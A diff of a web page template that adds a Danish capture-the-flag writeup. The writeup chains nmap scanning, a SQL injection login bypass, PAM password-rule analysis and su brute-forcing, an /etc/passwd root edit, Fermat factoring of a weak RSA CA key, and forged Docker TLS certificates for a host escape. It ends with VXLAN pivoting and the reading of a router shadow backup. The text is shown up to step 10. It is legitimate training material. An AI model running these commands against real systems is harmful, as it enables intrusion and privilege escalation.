@@ -3,7 +3,20 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>{{ page.title | default: "CTF Writeup — David Shmilowitz" }}</title>
+  <title>David Shmilowitz // Øvelsesoperation</title>
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/svg+xml" href="{{ site.baseurl }}/favicon.svg" />
+
+  <!-- Open Graph / link preview -->
+  <meta property="og:type"        content="website" />
+  <meta property="og:title"       content="David Shmilowitz // Øvelsesoperation" />
+  <meta property="og:description" content="CTF writeup — kompromittering af et layered og segmenteret miljø over 11 trin via SQL injection, RSA kryptoanalyse, Docker escape, VXLAN pivoting og LCG reverse engineering." />
+  <meta property="og:image"       content="{{ site.baseurl }}/og-image.png" />
+  <meta name="twitter:card"       content="summary_large_image" />
+  <meta name="twitter:title"      content="David Shmilowitz // Øvelsesoperation" />
+  <meta name="twitter:image"      content="{{ site.baseurl }}/og-image.png" />
+
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet" />
@@ -20,9 +33,9 @@
       --text:       #ffffff;
       --text-dim:   #999;
       --border:     #222;
-      --nav-h:      72px;
+      --nav-h:      64px;
       --side-bar:   0px;
-      --sidebar-w:  320px;
+      --sidebar-w:  340px;
       --radius:     4px;
       --transition: 0.3s ease;
       --font-head:  'Rajdhani', sans-serif;
@@ -30,7 +43,7 @@
       --font-body:  'DM Sans', sans-serif;
     }
 
-    html { scroll-behavior: smooth; }
+    html { scroll-behavior: smooth; font-size: 130%; }
 
     body {
       font-family: var(--font-body);
@@ -84,7 +97,7 @@
 
     .nav-logo {
       font-family: var(--font-mono);
-      font-size: 1.15rem;
+      font-size: 1rem;
       color: var(--text);
       letter-spacing: 2px;
       text-transform: uppercase;
@@ -93,12 +106,13 @@
       flex-shrink: 0;
     }
     .nav-logo span { color: var(--accent); }
+    .nav-logo .nav-author { color: var(--text); font-size: 0.85rem; letter-spacing: 1px; opacity: 0.75; }
 
     .nav-links { display: flex; gap: 0.25rem; list-style: none; }
 
     .nav-links a {
       color: var(--text);
-      font-size: 0.88rem;
+      font-size: 0.78rem;
       letter-spacing: 1.5px;
       text-transform: uppercase;
       font-family: var(--font-mono);
@@ -150,7 +164,7 @@
 
     .hero-eyebrow {
       font-family: var(--font-mono);
-      font-size: 0.9rem;
+      font-size: 0.75rem;
       letter-spacing: 4px;
       text-transform: uppercase;
       color: var(--accent);
@@ -160,7 +174,7 @@
 
     .writeup-hero h1 {
       font-family: var(--font-head);
-      font-size: clamp(3rem, 7vw, 5.5rem);
+      font-size: clamp(2.5rem, 6vw, 4.5rem);
       font-weight: 700;
       line-height: 1.1;
       color: var(--text);
@@ -172,31 +186,32 @@
     .hero-badges { display: flex; flex-wrap: wrap; gap: 0.6rem; }
     .badge {
       font-family: var(--font-mono);
-      font-size: 0.85rem;
+      font-size: 0.7rem;
       letter-spacing: 1px;
       text-transform: none;
-      padding: 0.4rem 0.9rem;
+      padding: 0.3rem 0.7rem;
       background: var(--bg2);
       border: 1px solid var(--border);
-      color: var(--text-dim);
+      color: var(--text);
     }
     .badge strong { color: var(--accent); }
 
     /* ── PAGE BODY: sidebar + content ── */
     .page-body {
       display: grid;
-      grid-template-columns: var(--sidebar-w) 1fr;
+      grid-template-columns: 82fr 18fr;
       min-height: calc(100vh - var(--nav-h));
     }
 
     /* Sidebar */
     .sidebar {
+      order: 2;
       position: sticky;
       top: var(--nav-h);
       height: calc(100vh - var(--nav-h));
       overflow-y: auto;
-      border-right: 1px solid var(--border);
-      padding: 2.5rem 1.5rem;
+      border-left: 1px solid var(--border);
+      padding: 2.5rem 2.5rem 2.5rem 1.5rem;
       scrollbar-width: thin;
       scrollbar-color: var(--border) transparent;
       background: var(--bg);
@@ -209,39 +224,60 @@
       color: var(--accent);
       text-transform: uppercase;
       margin-bottom: 1.2rem;
+      text-align: center;
     }
 
     .toc { list-style: none; }
-    .toc > li { border-left: 2px solid var(--border); transition: border-color var(--transition); }
-    .toc > li:hover { border-left-color: var(--accent); }
+    .toc > li { transition: border-color var(--transition); }
     .toc a {
       display: block;
-      padding: 0.55rem 1rem;
+      padding: 0.45rem 0.9rem;
       font-family: var(--font-body);
-      font-size: 0.95rem;
-      color: var(--text-dim);
+      font-size: 0.82rem;
+      color: var(--text);
       line-height: 1.35;
+      position: relative;
+      text-align: center;
       transition: color var(--transition);
     }
-    .toc a:hover { color: var(--text); }
-    .toc-step {
-      display: block;
-      font-family: var(--font-mono);
-      font-size: 0.72rem;
+    .toc a::after {
+      content: '';
+      position: absolute;
+      bottom: 0; left: 0.9rem; right: 0.9rem;
+      height: 1px;
+      background: var(--accent);
+      box-shadow: 0 0 6px var(--accent);
+      transform: scaleX(0);
+      transition: transform var(--transition);
+    }
+    .toc a::before {
+      content: '> ';
       color: var(--accent);
-      margin-bottom: 1px;
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      opacity: 0;
+      transition: opacity var(--transition);
+    }
+    .toc a:hover { color: var(--accent); }
+    .toc a:hover::before { opacity: 1; }
+    .toc a:hover::after { transform: scaleX(1); }
+    .toc-step {
+      display: inline;
+      font-family: var(--font-mono);
+      font-size: 0.62rem;
+      color: var(--accent);
+      margin-right: 0.4rem;
       letter-spacing: 1px;
     }
 
     /* Main content */
-    .writeup-content { padding: 5rem 6rem 6rem; min-width: 0; }
-    .writeup-content > * { max-width: 75ch; }
+    .writeup-content { order: 1; padding: 4rem 17% 6rem; min-width: 0; }
 
     .writeup-content h1 { display: none; }
 
     .writeup-content h2 {
       font-family: var(--font-head);
-      font-size: clamp(1.9rem, 3vw, 2.7rem);
+      font-size: clamp(1.6rem, 2.5vw, 2.2rem);
       font-weight: 700;
       color: var(--text);
       letter-spacing: 0.5px;
@@ -254,7 +290,7 @@
 
     .writeup-content h3 {
       font-family: var(--font-head);
-      font-size: 1.35rem;
+      font-size: 1.15rem;
       font-weight: 600;
       color: var(--text);
       margin: 2rem 0 0.75rem;
@@ -263,7 +299,7 @@
     }
     .writeup-content h3::before { content: '> '; color: var(--accent); font-family: var(--font-mono); }
 
-    .writeup-content p { color: var(--text-dim); font-size: 1.08rem; margin-bottom: 1rem; }
+    .writeup-content p { color: var(--text); font-size: 0.95rem; margin-bottom: 1rem; }
     .writeup-content strong { color: var(--text); font-weight: 600; }
     .writeup-content p a, .writeup-content li a { color: var(--accent); border-bottom: 1px solid var(--accent-dim); }
     .writeup-content p a:hover, .writeup-content li a:hover { border-color: var(--accent); color: #ff5252; }
@@ -274,12 +310,12 @@
       border: 1px solid #2a2a2a;
       border-left: 3px solid var(--accent);
       border-radius: var(--radius);
-      padding: 1.4rem 1.6rem;
-      margin: 1.4rem 0;
+      padding: 1.2rem 1.4rem;
+      margin: 1.2rem 0;
       overflow-x: auto;
       position: relative;
       font-family: var(--font-mono);
-      font-size: 0.95rem;
+      font-size: 0.82rem;
       line-height: 1.65;
       color: #ccc;
     }
@@ -299,23 +335,23 @@
     .writeup-content code { font-family: var(--font-mono); font-size: 0.85em; }
     .writeup-content p code, .writeup-content li code {
       background: var(--bg3); border: 1px solid var(--border);
-      padding: 1px 6px; color: var(--accent); font-size: 0.95rem; border-radius: 2px;
+      padding: 1px 5px; color: var(--accent); font-size: 0.82rem; border-radius: 2px;
     }
 
     .writeup-content blockquote {
       border-left: 3px solid var(--accent); background: var(--bg2);
-      padding: 1.1rem 1.4rem; margin: 1.4rem 0; color: var(--text-dim); font-size: 1.05rem;
+      padding: 1rem 1.2rem; margin: 1.2rem 0; color: var(--text); font-size: 0.92rem;
     }
     .writeup-content blockquote strong { color: var(--accent); }
     .writeup-content blockquote p { margin: 0; }
 
     .writeup-content ul { list-style: none; padding: 0; margin: 0.75rem 0 1.2rem; }
-    .writeup-content ul li { padding: 0.2rem 0 0.2rem 1.2rem; position: relative; color: var(--text-dim); font-size: 1.05rem; }
-    .writeup-content ul li::before { content: '▸'; position: absolute; left: 0; color: var(--accent); font-size: 0.75rem; top: 0.45rem; }
+    .writeup-content ul li { padding: 0.2rem 0 0.2rem 1.2rem; position: relative; color: var(--text); font-size: 0.93rem; }
+    .writeup-content ul li::before { content: '▸'; position: absolute; left: 0; color: var(--accent); font-size: 0.65rem; top: 0.45rem; }
     .writeup-content ul ul { margin: 0.3rem 0 0.3rem 1.2rem; }
-    .writeup-content ul ul li::before { content: '·'; font-size: 1rem; top: 0.25rem; }
+    .writeup-content ul ul li::before { content: '·'; font-size: 0.9rem; top: 0.25rem; }
     .writeup-content ol { padding-left: 1.4rem; margin: 0.75rem 0 1.2rem; }
-    .writeup-content ol li { color: var(--text-dim); font-size: 1.05rem; padding: 0.15rem 0; }
+    .writeup-content ol li { color: var(--text); font-size: 0.93rem; padding: 0.15rem 0; }
 
     .writeup-content img { max-width: 100%; border: 1px solid var(--border); border-radius: var(--radius); margin: 1.2rem 0; }
     .writeup-content hr { border: none; border-top: 1px solid var(--border); margin: 3rem 0; }
@@ -326,7 +362,7 @@
     footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; font-size: 0.8rem; color: var(--text-dim); font-family: var(--font-mono); }
     footer span { color: var(--accent); }
 
-    @media (max-width: 1024px) { :root { --sidebar-w: 220px; } .writeup-content { padding: 3rem 2.5rem 5rem; } }
+    @media (max-width: 1024px) { .page-body { grid-template-columns: 80fr 20fr; } .writeup-content { padding: 3rem 12% 5rem; } }
     @media (max-width: 768px) { .page-body { grid-template-columns: 1fr; } .sidebar { display: none; } .writeup-content { padding: 2.5rem 1.5rem 4rem; } }
     @media (max-width: 640px) {
       .nav-links { display: none; flex-direction: column; position: absolute; top: var(--nav-h); left: 0; right: 0; background: var(--bg2); border-bottom: 1px solid var(--border); padding: 1rem 2rem; gap: 1rem; }
@@ -339,7 +375,7 @@
 <body>
 
   <nav>
-    <div class="nav-logo"><span>[</span>Writeup<span>]</span></div>
+    <div class="nav-logo"><span>[</span>Writeup<span>]</span><span class="nav-author"> — David Shmilowitz</span></div>
     <ul class="nav-links" id="navLinks">
       <li><a href="#resumé">Resumé</a></li>
       <li><a href="#demonstrerede-kompetencer">Kompetencer</a></li>
@@ -387,7 +423,360 @@
     </aside>
 
     <main class="writeup-content">
-      {{ content }}
+      <h1>Øvelsesoperation Writeup</h1>
+      <hr>
+
+      <h2 id="resumé">Resumé</h2>
+      <p>Dette writeup dokumenterer kompromittering af et layered og segmenteret CTF miljø. Opgaven krævede, at en bred vifte af offensive sikkerhedsteknikker blev kædet sammen på tværs af 11 trin. Angrebet tog udgangspunkt i en unauthenticated position mod en webtjeneste. Herfra blev adgang opnået trin for trin via SQL injection, reverse engineering af et custom PAM-modul, RSA cryptoanalysis, Docker container escape, VXLAN network pivoting og exploitation af en custom password generator baseret på en Linear Congruential Generator (LCG).</p>
+      <p>Jeg nåede ikke at færdiggøre opgaven i sin helhed. I det sidste afsnit identificerede jeg angrebsflader på tre applikationer som jeg ikke nåede at udnytte fuldt ud: out-of-bounds sårbarhed i MIDI synthesizeren <code>saas</code>, en potentiel RCE mulighed i den MIPS emulerede <code>noted</code> applikation som jeg påbegyndte analyse af via Ghidra, samt en custom-patched V8 JavaScript engine i <code>wat</code> der indikerer en bevidst indsat sårbarhed i selve JavaScript fortolkeren. Jeg ser mulige veje frem mod exploitation af alle tre, og det er arbejde jeg vil fortsætte med og lave en endelig Writeup på denne øvelsesoperation.</p>
+      <blockquote><p><strong>Mål:</strong> <code>root@printserver</code></p></blockquote>
+      <hr>
+
+      <h2 id="demonstrerede-kompetencer">Demonstrerede Kompetencer</h2>
+      <h3>Reconnaissance</h3>
+      <ul>
+        <li>Port scanning</li>
+        <li>Vulnerability scanning</li>
+        <li>Web reconnaissance</li>
+        <li>Infrastructure mapping</li>
+        <li>Network topology awareness</li>
+      </ul>
+      <h3>Web Exploitation</h3>
+      <ul>
+        <li>SQL injection</li>
+        <li>Authentication bypass</li>
+        <li>Credential harvesting</li>
+        <li>CSRF analyse</li>
+        <li>Directory enumeration</li>
+      </ul>
+      <h3>Binær fil analysis &amp; reverse engineering</h3>
+      <ul>
+        <li>PAM-module analyse</li>
+        <li>ELF binær fil analyse</li>
+      </ul>
+      <h3>Cryptography</h3>
+      <ul>
+        <li>RSA kryptoanalyse</li>
+        <li>Fermat's factorization</li>
+        <li>LCG reverse engineering</li>
+        <li>Yescrypt hash cracking</li>
+        <li>TLS certificate forfalskning</li>
+        <li>OpenSSL</li>
+      </ul>
+      <h3>Privilege Escalation &amp; Lateral Movement</h3>
+      <ul>
+        <li>SUID binary enumeration</li>
+        <li>Docker container escape</li>
+        <li>/etc/passwd manipulation</li>
+        <li>Lateral movement via brute-force</li>
+        <li>Post-exploitation enumeration</li>
+      </ul>
+      <h3>Network &amp; Pivoting</h3>
+      <ul>
+        <li>VXLAN tunneling</li>
+        <li>SSH ProxyJump</li>
+        <li>BPF proxy analyse</li>
+        <li>Multi-hop pivoting</li>
+        <li>Docker TLS daemon exploitation</li>
+      </ul>
+      <h3>Scripting &amp; Automation</h3>
+      <ul>
+        <li>Python scripting</li>
+        <li>Algoritme optimering fra O(n²) til O(n)</li>
+        <li>Parallelization</li>
+        <li>Disk I/O buffering</li>
+        <li>Wordlist generation</li>
+        <li>Password cracking scripting</li>
+      </ul>
+      <h3>Protokol Analyse</h3>
+      <ul>
+        <li>Systemd-nspawn container analyse</li>
+        <li>Docker daemon analyse</li>
+      </ul>
+      <hr>
+
+      <h2 id="indholdsfortegnelse">Indholdsfortegnelse</h2>
+      <br>
+      <ul>
+        <li><a href="#trin-1-reconnaissance">Trin 1: Reconnaissance</a></li>
+        <li><a href="#trin-2-web-exploitation-sql-injection">Trin 2: Web Exploitation (SQL Injection)</a></li>
+        <li><a href="#trin-3-ssh-adgang">Trin 3: SSH adgang</a></li>
+        <li><a href="#trin-4-analyse-af-custom-pam-modul">Trin 4: Analyse af custom PAM-modul</a></li>
+        <li><a href="#trin-5-lateral-movement-til-pamela-brugeren">Trin 5: Lateral movement til pamela brugeren</a></li>
+        <li><a href="#trin-6-privilege-escalation-i-container">Trin 6: Privilege Escalation i container</a></li>
+        <li><a href="#trin-7-rsa-kryptoanalyse--fermats-factorization">Trin 7: RSA kryptoanalyse — Fermat's Factorization</a></li>
+        <li><a href="#trin-8-forfalskede-docker-tls-certifikater-og-host-escape">Trin 8: Forfalskede Docker TLS certifikater og host escape</a></li>
+        <li><a href="#trin-9-network-pivoting-via-vxlan-og-ssh-proxyjump">Trin 9: Network pivoting via VXLAN og SSH ProxyJump</a></li>
+        <li><a href="#trin-10-analyse-af-lcg-password-generator">Trin 10: Analyse af LCG password generator</a></li>
+        <li><a href="#trin-11-printserver-adgang-og-yderligere-discovery">Trin 11: Printserver adgang og yderligere discovery</a></li>
+        <li><a href="#wip-analyse-af-angrebsflader-på-router-applikationer">WIP: Analyse af angrebsflader på router applikationer</a></li>
+        <li><a href="#læringspunkter">Læringspunkter</a></li>
+      </ul>
+      <br>
+      <hr>
+
+      <h2 id="trin-1-reconnaissance">Trin 1: Reconnaissance</h2>
+      <h3>Portscanning</h3>
+      <p>Den indledende reconnaissance startede med et fuldt nmap portscan for at kortlægge eksponerede tjenester på målet.</p>
+      <div class="highlight"><pre><code>nmap -sV 192.168.78.128</code></pre></div>
+      <div class="highlight"><pre><code>PORT      STATE  SERVICE
+22/tcp    open   SSH
+80/tcp    open   HTTP
+2200/tcp  open   SSH 2.0
+2222/tcp  open   SSH 2.0</code></pre></div>
+      <p>Et opfølgende målrettet scan bekræftede, at de usædvanlige porte 2200 og 2222 begge præsenterede SSH bannere, hvilket tydede på alternative SSH endpoints eller Docker-containerporte. Dog ikke nogen CUPS<sup><a href="#fn1">1</a></sup> eller andre printer porte åbne.</p>
+      <h3>Sårbarhedsscanning</h3>
+      <div class="highlight"><pre><code>sudo nmap --script vuln 192.168.78.128 -oN vuln_scan.txt</code></pre></div>
+      <p>Et scriptbaseret vulnerability scan<sup><a href="#fn2">2</a></sup> blev udført mod målet og afslørede flere interessante fund på port 80. Nmap identificerede en potentiel CSRF sårbarhed i login-formularen, der poster til <code>/secrets</code>, samt eksistensen af <code>/robots.txt</code>. Derudover blev webserveren vurderet som sandsynligvis sårbar over for et Slowloris DoS-angreb<sup><a href="#fn3">3</a></sup> (CVE-2007-6750<sup><a href="#fn4">4</a></sup>). Hverken DOM-based XSS eller stored XSS blev fundet.</p>
+      <h3>Curl</h3>
+      <p>Jeg efterfulgte med curl:</p>
+      <div class="highlight"><pre><code>curl 192.168.78.128</code></pre></div>
+      <p>Som gav HTTP kildekoden. Her er et snippet af kommentaren:</p>
+      <div class="highlight"><pre><code>&lt;!-- TODO: Check for vulnerabilities before deploying!          --&gt;
+&lt;!-- I ran this through our scanner and uh... 'secure' is       --&gt;
+&lt;!-- doing some HEAVY lifting! I counted at least 2 potential   --&gt;
+&lt;!-- vulns before my coffee got cold. - pamela                  --&gt;
+&lt;!-- P.S. If you're reading this in a breach report... I TOLD   --&gt;
+&lt;!-- YOU SO                                                      --&gt;</code></pre></div>
+      <p><strong>Kildekodens kommentar</strong> afslører:</p>
+      <ul>
+        <li>Brugernavnet <code>pamela</code> — en bruger der bliver et direkte mål senere i attack chain.</li>
+        <li>Mindst 2 sårbarheder eksisterer ifølge pamela selv.</li>
+      </ul>
+      <p><strong>Selve HTML-koden</strong> afslører:</p>
+      <ul>
+        <li>Login-formularen poster til <code>/secrets</code> via POST. Et direkte mål for SQL injection og bruteforce. Dette bekræfter nmaps tidligere fund.</li>
+        <li>Ingen CSRF-token i formularen. Bekræfter nmaps tidligere fund.</li>
+        <li>Ingen rate-limiting eller captcha er synlig i koden.</li>
+      </ul>
+      <p>Herefter tjekkede jeg hvad der kørte på port 2200 og 2222 med nc. Begge kørte SSH 2.0:</p>
+      <div class="highlight"><pre><code>nc 192.168.78.128 2200
+nc 192.168.78.128 2222</code></pre></div>
+      <img src="assets/images/image1.png" alt="SSH banner fra port 2200">
+      <hr>
+
+      <h2 id="trin-2-web-exploitation-sql-injection">Trin 2: Web Exploitation (SQL Injection)</h2>
+      <h3>Web Reconnaissance</h3>
+      <p>Et efterfølgende gobuster<sup><a href="#fn5">5</a></sup> scan bekræftede endpoint med en 401 statuskode, men tilføjede ingen nye oplysninger ud over hvad kildekoden allerede havde afsløret.</p>
+      <div class="highlight"><pre><code>gobuster dir -u http://192.168.78.128 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old,zip</code></pre></div>
+      <h3>Authentication Bypass via SQL Injection</h3>
+      <p>Login-formularen sendte credentials til <code>/secrets</code> via en POST request. Test af en klassisk SQL payload omgik autentificeringen:</p>
+      <div class="highlight"><pre><code>curl -X POST http://192.168.78.128/secrets -d "username=admin' OR '1'='1&amp;password=test"</code></pre></div>
+      <p>SQL injektionen lykkedes og bekræftede, at login-formularen ikke anvendte prepared statements. Dette gav adgang til Secure Vaults indhold og leverede de credentials, der var nødvendige til næste trin.</p>
+      <div class="highlight"><pre><code>Username: user
+Password: hunter2</code></pre></div>
+      <hr>
+
+      <h2 id="trin-3-ssh-adgang">Trin 3: SSH adgang</h2>
+      <p>Med de credentials, der blev hentet fra Secure Vault, blev SSH adgang oprettet til målet. Standardporten 22 blev anvendt, da SSH ikke virkede mod porte 2200/2222.</p>
+      <div class="highlight"><pre><code>ssh user@192.168.78.128</code></pre></div>
+      <p>Post login enumeration bekræftede at den opnåede bruger var en standard unprivileged bruger uden sudo rettigheder, og at brugeren <code>pamela</code> eksisterede på systemet:</p>
+      <img src="assets/images/image2.png" alt="whoami og id output">
+      <img src="assets/images/image3.png" alt="/etc/passwd grep output">
+      <hr>
+
+      <h2 id="trin-4-analyse-af-custom-pam-modul">Trin 4: Analyse af custom PAM-modul</h2>
+      <h3>Post exploitation enumeration</h3>
+      <p>En systematisk post exploitation blev gennemført for at identificere privilege escalation:</p>
+      <ul>
+        <li>SUID binary enumeration</li>
+        <li>Cron job analyse</li>
+        <li>Søgning efter skrivbare filer og mapper</li>
+        <li>Inspektion af kørende processer</li>
+        <li>Kernel version mapping</li>
+        <li>Backup fil søgning</li>
+        <li>Bash_history tjek</li>
+        <li>SSH key hunting</li>
+      </ul>
+      <p>Bemærkelsesværdige fund inkluderede to SUID binaries (<code>mount</code> og <code>passwd</code>), som ifølge GTFOBins<sup><a href="#fn6">6</a></sup> er privilege escalation muligheder, men begge viste sig uanvendelige i denne konfiguration. Cron jobs eksisterede men var ikke skrivbare. Ingen SSH nøgler blev fundet.</p>
+      <h3>Discovery af custom PAM-modul</h3>
+      <p>Med kendskab til brugernavnet <code>pamela</code> fra kildekoden, og det faktum at <code>su pamela</code> krævede en adgangskode, var det naturligt at undersøge om der eksisterede et custom PAM-modul med hendes navn. En målrettet søgning bekræftede mistanken:</p>
+      <div class="highlight"><pre><code>find / -name "*pam_pamela*" 2&gt;/dev/null</code></pre></div>
+      <p>Dette returnerede stien til et non-standard PAM-modul:</p>
+      <div class="highlight"><pre><code>/usr/lib/x86_64-linux-gnu/security/pam_pamela.so</code></pre></div>
+      <p>Læsning af <code>pam_pamela.so</code> med <code>cat</code> gjorde det muligt at udtrække læsbare strings fra ELF-binæren. Trods det rodede binære output var error message strings fuldt læselige og afslørede en komplet liste over adgangskodekrav for <code>pamela</code>:</p>
+      <div class="highlight"><pre><code>Your password must be at most 20 characters long
+Your password must contain an uppercase character
+Your password must contain a lowercase character
+Your password must contain a digit
+Your password must contain a special character
+Your password must contain a roman numeral
+Sum of digits must be a cube
+Your password must have at least N consecutive letters
+Number of one bits must be &gt;= N
+Number of one bits modulo N must be zero
+Your password must be a palindrome</code></pre></div>
+      <hr>
+
+      <h2 id="trin-5-lateral-movement-til-pamela-brugeren">Trin 5: Lateral movement til pamela brugeren</h2>
+      <h3>Python password generator</h3>
+      <p>For at opfylde alle elleve krav lavede jeg et Python-script:</p>
+      <img src="assets/images/image4.png" alt="Python password generator script">
+      <p>Scriptet genererede 60 gyldige kandidat passwords. Et eksempel på outputtet:</p>
+      <div class="highlight"><pre><code>FOUND: ~tuvwx0V0xwvut~  (bits=68, sum=0)
+FOUND: ~mnopq4V4qponm~  (bits=68, sum=8)
+FOUND: ~vwxyZ0V0Zyxwv~  (bits=68, sum=0)
+... (60 total valid passwords generated)</code></pre></div>
+      <h3>Automatiseret testing med suBF.sh</h3>
+      <p>Med en liste på 60 gyldige passwords genereret ud fra PAM-modulets krav blev <code>suBF.sh</code><sup><a href="#fn7">7</a></sup> brugt til automatisk at afprøve kandidaterne med <code>su pamela</code>. Scriptet blev tilpasset til at acceptere den custom wordliste som jeg genererede i forrige trin.</p>
+      <div class="highlight"><pre><code>chmod +x suBF.sh
+./suBF.sh -u pamela -w password_list.txt -t 0.5 -s 0.003</code></pre></div>
+      <img src="assets/images/image5.png" alt="suBF.sh output">
+      <p>Outputtet viser at mange af de genererede passwords ikke virkede. For eksempel fejlede loginforsøg med <code>~tuvwx0V0xwvut~</code>, mens <code>~mnopq4V4qponm~</code> virkede.</p>
+      <p>En gennemgang af scriptet afslørede at PAM-modulet tilsyneladende ikke accepterer 0 som en gyldig "perfect cube". Kravet burde have specificeret "positiv perfect cube", da 0 = 0³ matematisk set er korrekt.</p>
+      <blockquote><p><strong>Pamelas password:</strong> <code>~mnopq4V4qponm~</code></p></blockquote>
+      <hr>
+
+      <h2 id="trin-6-privilege-escalation-i-container">Trin 6: Privilege Escalation i container</h2>
+      <p>Login som <code>pamela</code> afslørede et miljø med flere Docker containers. Ved at identificere en tilgængelig Docker daemon blev <code>docker exec</code> brugt til at opnå en root shell inde i containeren. Ændring af <code>/etc/passwd</code> til at sætte pamelas UID/GID til 0 gav persistent root adgang inde i containeren.</p>
+      <div class="highlight"><pre><code>docker exec -it 1ee55c34929d bash  # root shell inside container
+cp /etc/passwd /etc/passwd.bak
+sed -i 's/^pamela:x:1001:1001:/pamela:x:0:0:/' /etc/passwd</code></pre></div>
+      <hr>
+
+      <h2 id="trin-7-rsa-kryptoanalyse--fermats-factorization">Trin 7: RSA kryptoanalyse — Fermat's Factorization</h2>
+      <p>Docker daemonen på host var sikret med TLS mutual authentication<sup><a href="#fn8">8</a></sup> (port 2376). For at forfalske et gyldigt klientcertifikat var det nødvendigt at rekonstruere CA's private key. Inspektion afslørede CA's RSA public key (<code>N</code>) i systemet. Primtallene <code>p</code> og <code>q</code>, der blev brugt til at generere <code>N</code>, var farligt tæt på hinanden — en svaghed der gør <code>N</code> sårbar over for Fermat's factorization<sup><a href="#fn9">9</a></sup>, som kører i næsten konstant tid når <code>p ≈ q</code>.</p>
+      <p>Jeg lavede et Python script til at faktorisere den 2048-bit modulus:</p>
+      <div class="highlight"><pre><code>def fermat(n):
+    a = math.isqrt(n) + 1
+    while True:
+        b2 = a*a - n
+        if is_square(b2):
+            b = math.isqrt(b2)
+            return a + b, a - b
+        a += 1
+
+p, q = fermat(n)
+# Result: p - q = 2710  (primes were extremely close)</code></pre></div>
+      <p>Ovenstående script blev kørt igennem på få sekunder og bekræftede sårbarheden. Primtallene <code>p</code> og <code>q</code> var ekstremt tætte på hinanden (p − q = 2710). Med <code>p</code> og <code>q</code> kendt kunne jeg med hjælp fra AI rekonstruere den fulde RSA private key:</p>
+      <img src="assets/images/image6.png" alt="RSA private key rekonstruktion">
+      <hr>
+
+      <h2 id="trin-8-forfalskede-docker-tls-certifikater-og-host-escape">Trin 8: Forfalskede Docker TLS certifikater og host escape</h2>
+      <p>Med den rekonstruerede CA private key kunne jeg nu udstede certifikater som Docker daemon'en ville stole på. Første skridt var at konvertere nøglen fra <code>ASN.1/DER</code> format til <code>PEM</code> format som OpenSSL kan arbejde med:</p>
+      <div class="highlight"><pre><code>openssl asn1parse -genconf key_in_text.txt -out key_ca.der
+openssl rsa -inform DER -in key_ca.der -out key_ca.pem</code></pre></div>
+      <p>Herefter blev et nyt client certificate genereret og signed med CA private key'en. Docker daemon'en ville nu betragte dette certifikat som legitimt:</p>
+      <div class="highlight"><pre><code>openssl genrsa -out key.pem 2048
+openssl req -subj '/CN=client' -new -key key.pem -out client.csr
+openssl x509 -req -days 365 -sha256 -in client.csr -CA ca.pem -CAkey key_ca.pem -CAcreateserial -out cert.pem</code></pre></div>
+      <p>Med et gyldigt certifikat kunne jeg autentificere direkte mod Docker daemon'en på host maskinen (172.17.0.1:2376) og starte en privilegeret container med hele host filsystemet bind-mountet. <code>chroot</code> ind i <code>/host</code> gav fuld adgang til den underliggende host:</p>
+      <div class="highlight"><pre><code>docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H \
+172.17.0.1:2376 run -it --rm --privileged --net=host -v /:/host --entrypoint chroot ssh-server /host</code></pre></div>
+      <hr>
+
+      <h2 id="trin-9-network-pivoting-via-vxlan-og-ssh-proxyjump">Trin 9: Network pivoting via VXLAN og SSH ProxyJump</h2>
+      <h3>Opsætning af VXLAN tunnel</h3>
+      <p>På <code>hostcontainer</code> blev et VXLAN overlay netværk opdaget, der forbandt til et internt segment (10.0.42.0/24). En lokal VXLAN interface blev oprettet for at tilslutte sig netværket og tildele en IP-adresse inden for segmentet:</p>
+      <div class="highlight"><pre><code>ip link add vxlan0 type vxlan id 42 remote 192.168.235.65 dev host0 dstport 4789
+ip link set vxlan0 up
+ip addr add 10.0.42.2/24 dev vxlan0</code></pre></div>
+      <h3>BPF SSH proxy — "baby-passes-filters"</h3>
+      <p>En binær fil med navnet <code>baby-passes-filters</code> (et ordspil på BPF, Berkeley Packet Filter<sup><a href="#fn10">10</a></sup>) var at finde på <code>hostcontainer</code>. Da jeg eskalerede til root i den oprindelige container var der et hint ved navn <code>chat.log</code>. Her blev "bpf service" og "vxlan" omtalt, så <code>baby-passes-filters</code> filen var værd at undersøge nærmere. <code>ss</code> outputtet viste at <code>baby-passes-filters</code> lytter på port 666 (Doom port<sup><a href="#fn11">11</a></sup>).</p>
+      <img src="assets/images/image7.png" alt="ss -tlnp output med baby-passes-filters">
+      <p>Ved at undersøge de kørende tjenester og <code>/root/.ssh/ssh-config</code> stod det klart, at denne binære fungerede som en BPF baseret SSH proxy, der opsnappede og videresendte forbindelser til den interne maskine på port 2222.</p>
+      <p>Config filen afslørede et alias <code>hostcontainer</code> med et ProxyJump, der pegede på denne proxy. Problemet var at <code>IdentityFile</code> pegede på <code>hostcontainer.id_ed25519</code> — en relative path der ikke eksisterede. Den korrekte nøgle lå på <code>/root/.ssh/id_ed25519</code>. En simpel patch løste problemet:</p>
+      <div class="highlight"><pre><code>sed -i 's|IdentityFile hostcontainer.id_ed25519|IdentityFile /root/.ssh/id_ed25519|g' /root/.ssh/ssh-config
+
+ssh -F /root/.ssh/ssh-config hostcontainer</code></pre></div>
+      <p>Ovenstående kommandoer resulterede i en vellykket forbindelse til <code>root@hostcontainer</code> via <code>baby-passes-filters</code> proxyen.</p>
+      <p>Herfra tjekkede jeg <code>ssh-config</code>, <code>.bash_history</code> og <code>git</code> mappen med:</p>
+      <div class="highlight"><pre><code>ssh -F /root/.ssh/ssh-config hostcontainer "env; cat /root/.bash_history"</code></pre></div>
+      <hr>
+
+      <h2 id="trin-10-analyse-af-lcg-password-generator">Trin 10: Analyse af LCG password generator</h2>
+      <h3>Discovery af router shadow filen</h3>
+      <p>Fra <code>hostcontainer</code> kunne jeg aflæse <code>router-shadow.bak</code>:</p>
+      <div class="highlight"><pre><code>ssh -F /root/.ssh/ssh-config hostcontainer "cat /root/git/pwgen/router-shadow.bak"</code></pre></div>
